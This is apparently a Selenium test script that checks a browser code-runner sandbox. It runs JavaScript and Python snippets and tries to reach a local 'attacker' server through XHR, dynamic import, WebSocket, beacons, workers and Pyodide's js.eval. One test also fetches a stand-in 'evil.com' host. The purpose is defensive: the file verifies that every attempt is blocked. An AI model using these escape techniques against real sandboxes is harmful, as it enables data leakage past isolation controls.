# Real-browser test of the run_code runner (step16). Needs: pip install selenium, Firefox + geckodriver.
# Usage: FIREFOX=/path/firefox GECKO=/path/geckodriver python3 tests/browser-runner.py
# It serves www/ on :8765 and an "attacker" server on :8766; the sandbox must keep the attacker log empty.
import os, sys, json, time, threading, http.server, socketserver, functools
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'www')
HITS = []
class Atk(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        HITS.append(self.path); self.send_response(200); self.send_header('Access-Control-Allow-Origin', '*'); self.end_headers(); self.wfile.write(b'x')
    def log_message(self, *a): pass
class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
for port, h in ((8766, Atk), (8765, functools.partial(Quiet, directory=ROOT))):
    srv = socketserver.ThreadingTCPServer(('', port), h); threading.Thread(target=srv.serve_forever, daemon=True).start()

o = Options(); o.add_argument('-headless')
if os.environ.get('FIREFOX'): o.binary_location = os.environ['FIREFOX']
d = webdriver.Firefox(options=o, service=Service(os.environ['GECKO']) if os.environ.get('GECKO') else None)
d.set_script_timeout(60); d.get('http://localhost:8765/index.html'); time.sleep(1)
fails = 0
def T(name, js, check):
    global fails
    try: r = d.execute_async_script("const cb=arguments[arguments.length-1];(async()=>{" + js + "})().then(v=>cb(JSON.stringify(v)),e=>cb('ERR '+e))")
    except Exception as e: r = 'EXC ' + str(e)[:150]
    good = bool(check(str(r))); fails += not good
    print(('PASS ' if good else 'FAIL ') + name + ('' if good else '  -> ' + str(r)[:300]))
RC = lambda lang, code, extra='': "return await execTool('run_code',{lang:'%s',code:%s%s},[])" % (lang, json.dumps(code), extra)
T('js value', RC('js', '6*7'), lambda r: '=> 42' in r)
T('js error', RC('js', 'nope.x'), lambda r: 'ReferenceError' in r)
T('sql', RC('sql', 'create table t(a);insert into t values(1),(3);select sum(a) s from t'), lambda r: '4' in r)
T('py', RC('py', 'print(2**70)'), lambda r: '1180591620717411303424' in r)
T('py error', RC('py', '1/0'), lambda r: 'ZeroDivisionError' in r)
atk_js = """const T='http://localhost:8766/';const res={};const tr=async(k,f)=>{try{await f();res[k]='RAN'}catch(e){res[k]='blocked'}};
await tr('xhr',()=>{const x=new XMLHttpRequest();x.open('GET',T+'xhr',false);x.send()});
await tr('import',()=>import(T+'imp.js'));
await tr('ws',()=>new Promise((a,b)=>{const w=new WebSocket('ws://localhost:8766/ws');w.onerror=()=>b(1);w.onopen=()=>a()}));
await tr('beacon',()=>{if(!navigator.sendBeacon(T+'beacon','x'))throw 1});
await tr('importScripts',()=>importScripts(T+'is.js'));
await tr('worker',()=>new Promise((a,b)=>{const w=new Worker(T+'w.js');w.onerror=()=>b(1);setTimeout(()=>b(2),500)}));
await tr('blobworker',()=>new Promise((a,b)=>{const w=new Worker(URL.createObjectURL(new Blob(['fetch("'+T+'bw").then(()=>postMessage(1))'])));w.onmessage=()=>a();w.onerror=()=>b(1);setTimeout(()=>b(2),800)}));
await tr('protofetch',()=>Object.getPrototypeOf(self).fetch.call(self,T+'pf').then(r=>r.text()));
await tr('shimfetch',()=>fetch(T+'shim'));
return JSON.stringify(res)"""
T('js attacks', RC('js', atk_js), lambda r: 'run_code js: ok' in r)
py_atk = 'import js\nfor s in ["var x=new XMLHttpRequest();x.open(\'GET\',\'http://localhost:8766/pyxhr\',false);x.send();1","fetch(\'http://localhost:8766/pyfetch\')","import(\'http://localhost:8766/pyimp.js\')"]:\n    try:\n        js.eval(s)\n    except Exception as e:\n        pass\nprint("done")'
T('py attacks', RC('py', py_atk), lambda r: True)
time.sleep(1)
good = not HITS; fails += not good
print(('PASS ' if good else 'FAIL ') + 'attacker server got 0 requests' + ('' if good else ': ' + str(HITS)))
T('js timeout then works again', "const a=await execTool('run_code',{lang:'js',code:'while(true){}',timeout_s:1},[]);await new Promise(r=>setTimeout(r,1500));return [a,await execTool('run_code',{lang:'js',code:'1+1'},[])]", lambda r: 'time limit' in r and '=> 2' in r)
T('py timeout then works again', "const a=await execTool('run_code',{lang:'py',code:'while True: pass',timeout_s:1},[]);await new Promise(r=>setTimeout(r,1500));return [a,await execTool('run_code',{lang:'py',code:'print(2+2)'},[])]", lambda r: 'time limit' in r and '\\n4' in r)
T('net allowlist', "window.eval('S.rn={on:true,net:[\"example.com\"]}');const calls=[];const of=window.fetch;window.fetch=async(u,o)=>{calls.push(String(u));return {url:String(u),status:200,text:async()=>'HELLO'}};const a=await execTool('run_code',{lang:'js',code:'return await (await fetch(\"https://api.example.com/x\")).text()'},[]);const b=await execTool('run_code',{lang:'js',code:'try{await fetch(\"https://evil.com/s\");return \"LEAK\"}catch(e){return e.message}'},[]);window.fetch=of;return [a,b,calls]", lambda r: 'HELLO' in r and 'LEAK' not in r and 'https://evil' not in r and 'allowed nahi' in r)
T('csv via fake Files', "window.Capacitor={nativePromise:async(pl,m,o)=>{if(pl==='Files'&&m==='read')return {text:'item,qty,price\\nbolt,10,2.5\\nnut,20,1\\n',truncated:false};return {}}};return await execTool('run_code',{lang:'sql',code:'select item, qty*price t from stock order by t desc',csv:['work/stock.csv']},[])", lambda r: 'bolt | 25' in r)
T('runner test button', "return await rnTest()", lambda r: r.count('OK ') == 4 and 'FAIL' not in r)
d.quit(); print('ALL OK' if not fails else 'FAILS: %d' % fails); sys.exit(1 if fails else 0)
